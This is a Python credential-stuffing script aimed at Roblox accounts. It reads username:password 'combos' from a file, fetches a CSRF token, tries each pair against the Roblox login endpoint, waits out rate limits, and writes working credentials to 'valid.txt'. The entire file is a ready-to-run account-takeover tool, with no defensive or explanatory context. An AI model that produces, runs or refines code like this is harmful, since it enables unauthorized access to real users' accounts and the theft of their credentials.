import requests
import json
import time

def get_csrf_token(session):
    try:
        res = session.post("https://auth.roblox.com/v2/login", headers={"Content-Type": "application/json"})
        return res.headers.get("x-csrf-token")
    except Exception as e:
        print(f"[ERROR] Couldn't get CSRF token: {e}")
        return None

def login_user(session, username, password):
    token = get_csrf_token(session)
    if not token:
        return "error", None

    headers = {
        "Content-Type": "application/json",
        "x-csrf-token": token
    }
    data = {
        "ctype": "Username",
        "cvalue": username,
        "password": password
    }

    try:
        res = session.post("https://auth.roblox.com/v2/login", headers=headers, data=json.dumps(data))

        if res.status_code == 200:
            return "valid", res.json()
        elif res.status_code == 401:
            return "invalid", None
        elif res.status_code == 429:
            return "rate_limited", None
        else:
            return "unknown", res.text
    except Exception as e:
        return "error", str(e)

def check_combo_file(filename):
    try:
        with open(filename, "r") as f:
            combos = f.read().splitlines()
    except FileNotFoundError:
        print(f"[ERROR] File '{filename}' not found.")
        return

    for line in combos:
        if ":" not in line:
            continue
        username, password = line.strip().split(":", 1)

        session = requests.Session()
        status, info = login_user(session, username, password)

        if status == "valid":
            print(f"[VALID] {username}:{password}")
            with open("valid.txt", "a") as vf:
                vf.write(f"{username}:{password}\n")
        elif status == "invalid":
            print(f"[INVALID] {username}:{password}")
        elif status == "rate_limited":
            print("[RATE LIMITED] Pausing 10 seconds...")
            time.sleep(10)
        elif status == "error":
            print(f"[ERROR] {info}")
        else:
            print(f"[UNKNOWN RESPONSE] {info}")

if __name__ == "__main__":
    check_combo_file("combos.txt")
